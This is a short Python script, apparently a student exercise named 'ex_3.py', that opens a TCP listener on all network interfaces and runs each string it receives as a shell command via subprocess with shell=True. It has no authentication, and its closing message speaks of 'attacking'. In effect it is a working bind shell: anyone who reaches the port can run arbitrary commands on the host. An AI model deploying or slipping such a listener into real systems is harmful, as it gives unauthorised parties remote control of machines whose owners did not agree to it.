# Name: ex_3.py
# Author: dipper
# Date: 28.5.2026
# Description: the code takes cmd commands through a tcp connection
#                   i thought i should have done through a file so i did it to
# imports
import socket
import subprocess
from socket import SHUT_RDWR




BYTES_RECIVED = 1024
DECODE_TYPE = "utf-8"


def main():
        host = "0.0.0.0"
        port = int(input("enter port: (like 65432)\n"))
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((host, port))
            server_socket.listen()
            connection, address = server_socket.accept()
            with connection:
                print(f"Connected by {address}")
                while True:
                    data = connection.recv(BYTES_RECIVED)

                    #convert bytes to string
                    data = data.decode(DECODE_TYPE) 

                    # if we receive close then close connection
                    if (data == "close"):
                        print(f"command: {data}")
                        break

                    #running the command
                    command = subprocess.run(data,shell=True ,capture_output=True, text=True)



                    # if we receive close then close connection
                    if (data == "close\r\n"):
                        print(f"close connection")
                        break                
                    print("Output:", command.stdout)


        input("been nice attackingwith u \nbye")








if __name__=="__main__":
    main()